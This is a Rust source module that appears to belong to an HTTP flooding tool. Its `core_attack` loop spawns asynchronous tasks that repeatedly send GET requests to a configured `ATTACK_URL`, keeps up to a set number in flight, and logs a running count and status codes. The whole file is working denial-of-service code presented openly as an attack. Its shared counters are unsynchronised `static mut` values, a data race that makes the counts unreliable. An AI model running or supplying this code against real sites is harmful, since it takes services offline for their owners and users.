use core::time;
use std::thread;

use reqwest::Response;

static mut AMOUNT: u128 = 0;

static mut ON_THREADS: u128 = 0;

pub async fn start() {
    core_attack();
}
async fn request(url: &str) -> Result<Response, reqwest::Error> {
    let output = reqwest::Client::new().get(url).send().await;
    return match output {
        Ok(data) => Ok(data),
        Err(err) => Err(err),
    };
}

fn core_attack() {
    loop {
        unsafe {
            if AMOUNT < ON_THREADS {
                thread::sleep(time::Duration::from_millis(2));
            }
            if ON_THREADS < crate::FORCE {
                tokio::spawn(async {
                    ON_THREADS = ON_THREADS + 1;
                    let error_data = request(&crate::ATTACK_URL).await;
                    match error_data {
                        Ok(status_code) => {
                            AMOUNT = AMOUNT + 1;
                            ON_THREADS = ON_THREADS - 1;
                            println!(
                                "Ran: {}, On threads: {}, Status code {}",
                                AMOUNT,
                                ON_THREADS,
                                status_code.status()
                            );
                        }
                        Err(data) => {
                            ON_THREADS = ON_THREADS - 1;
                            println!("OH NO BAD Status Code Recived is {}", data.to_string());
                        }
                    }
                });
            } else {
                thread::sleep(time::Duration::from_millis(2));
            }
        }
    }
}
